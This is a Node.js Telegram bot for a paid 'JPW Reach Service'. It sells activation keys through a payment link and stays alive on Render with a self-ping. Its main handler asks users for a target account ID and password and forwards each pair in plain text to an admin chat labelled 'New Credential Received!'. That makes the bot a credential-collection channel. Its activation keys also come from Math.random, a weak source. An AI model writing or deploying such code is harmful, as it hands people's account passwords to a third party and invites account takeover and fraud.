require('dotenv').config();
const { Telegraf } = require('telegraf');
const fs = require('fs');
const http = require('http');

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const KEYS_FILE = './keys.json';

const INSTAMOJO_LINK = 'https://jpwreachedpro.mojo.page/jpw-reached-pro';
const activeTargets = new Map();

// --- Local Keys Management Functions ---
function loadKeys() {
  if (!fs.existsSync(KEYS_FILE)) {
    fs.writeFileSync(KEYS_FILE, JSON.stringify([]));
  }
  try {
    const data = fs.readFileSync(KEYS_FILE, 'utf8');
    return JSON.parse(data);
  } catch (err) {
    return [];
  }
}

function saveKeys(keys) {
  fs.writeFileSync(KEYS_FILE, JSON.stringify(keys, null, 2));
}

// --- Self-Ping & Web Server to Keep Render Alive ---
const PORT = process.env.PORT || 3000;
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Bot is active and running!\n');
});

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

const SELF_URL = process.env.RENDER_EXTERNAL_URL;
if (SELF_URL) {
  setInterval(() => {
    fetch(SELF_URL)
      .then(() => console.log('Self-ping successful!'))
      .catch((err) => console.log('Self-ping failed:', err.message));
  }, 14 * 60 * 1000); // Ping every 14 minutes
}

// --- Bot Commands & Logic ---

bot.start((ctx) => {
  ctx.reply(
    `Welcome to JPW Reach Service! 🎉\n\n` +
    `💳 To purchase a package, please pay here:\n👉 ${INSTAMOJO_LINK}\n\n` +
    `🔑 Send your Activation Key here after payment.\n` +
    `🎯 Or send your Target ID and Password in this format:\n\`TARGET_ID PASSWORD\``,
    { parse_mode: 'Markdown' }
  );
});

bot.command('buy', (ctx) => {
  ctx.reply(`You can purchase your package from here:\n👉 ${INSTAMOJO_LINK}`);
});

// Admin Command to generate a new dynamic key: /genkey Plan_Name
bot.command('genkey', (ctx) => {
  if (!ADMIN_CHAT_ID || ctx.chat.id.toString() !== ADMIN_CHAT_ID.toString()) {
    return ctx.reply('⚠️ This command is only for the admin.');
  }

  const args = ctx.message.text.split(' ');
  args.shift();
  const planName = args.join(' ') || 'Standard Plan';

  const randomString = Math.random().toString(36).substring(2, 8).toUpperCase();
  const dynamicKey = `JPW-${Math.floor(1000 + Math.random() * 9000)}-${randomString}`;

  const keys = loadKeys();
  keys.push({
    activationKey: dynamicKey,
    planName: planName,
    isUsed: false
  });
  saveKeys(keys);

  return ctx.reply(
    `✅ **New Dynamic Key Generated Successfully!**\n\n` +
    `🔑 Key: \`${dynamicKey}\`\n` +
    `📦 Plan: ${planName}\n\n` +
    `This is a one-time use key.`,
    { parse_mode: 'Markdown' }
  );
});

// Message Handler
bot.on('text', async (ctx) => {
  if (ADMIN_CHAT_ID && ctx.chat.id.toString() === ADMIN_CHAT_ID.toString()) {
    return handleAdminReply(ctx);
  }

  const text = ctx.message.text.trim();
  if (text.startsWith('/')) return;

  const parts = text.split(' ');

  // Target ID & Password Case
  if (parts.length === 2) {
    const targetId = parts[0];
    const password = parts[1];
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const userId = ctx.from.id;

    activeTargets.set(targetId, userId);

    const adminMessage = `🚨 **New Credential Received!**\n\n` +
                         `👤 **User:** ${username} (ID: \`${userId}\`)\n` +
                         `🎯 **Target ID:** \`${targetId}\`\n` +
                         `🔑 **Password:** \`${password}\`\n\n` +
                         `*Reply to this message or include the Target ID to send updates back to the user.*`;

    try {
      await bot.telegram.sendMessage(ADMIN_CHAT_ID, adminMessage, { parse_mode: 'Markdown' });
      return ctx.reply('✅ Your details have been submitted successfully. Please wait for processing!');
    } catch (err) {
      console.error('Admin send error:', err);
      return ctx.reply('❌ Failed to send data. Please try again later.');
    }
  }

  // Activation Key Verification Case
  const keys = loadKeys();
  const foundKeyIndex = keys.findIndex(k => k.activationKey === text);

  if (foundKeyIndex === -1) {
    return ctx.reply('❌ Invalid key. Please enter a correct activation key or use the proper format (`ID PASSWORD`).');
  }

  if (keys[foundKeyIndex].isUsed) {
    return ctx.reply('⚠️ This key has already been used and cannot be used again.');
  }

  keys[foundKeyIndex].isUsed = true;
  keys[foundKeyIndex].usedBy = ctx.from.id.toString();
  saveKeys(keys);

  const plan = keys[foundKeyIndex].planName;
  return ctx.reply(`🎉 Congratulations! Your '${plan}' plan has been activated successfully.`);
});

// Function to route admin replies back to the correct user
async function handleAdminReply(ctx) {
  const replyText = ctx.message.text;
  let targetUserId = null;

  for (let [tId, uId] of activeTargets.entries()) {
    if (replyText.includes(tId)) {
      targetUserId = uId;
      break;
    }
  }

  if (!targetUserId && ctx.message.reply_to_message) {
    const originalText = ctx.message.reply_to_message.text || '';
    for (let [tId, uId] of activeTargets.entries()) {
      if (originalText.includes(tId)) {
        targetUserId = uId;
        break;
      }
    }
  }

  if (targetUserId) {
    try {
      await bot.telegram.sendMessage(targetUserId, `📩 **Update:**\n\n${replyText}`);
      await ctx.reply('✅ Message sent to the user successfully!');
    } catch (err) {
      console.error('User send error:', err);
      return ctx.reply('❌ Failed to deliver message to the user (Maybe they blocked the bot).');
    }
  } else {
    await ctx.reply('⚠️ Target ID could not be recognized. Please include the relevant Target ID in your message.');
  }
}

// Bot Launch
bot.launch()
  .then(() => console.log('English Bot with Self-Ping & Key System is running!'))
  .catch(err => console.log('Bot launch error:', err));

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
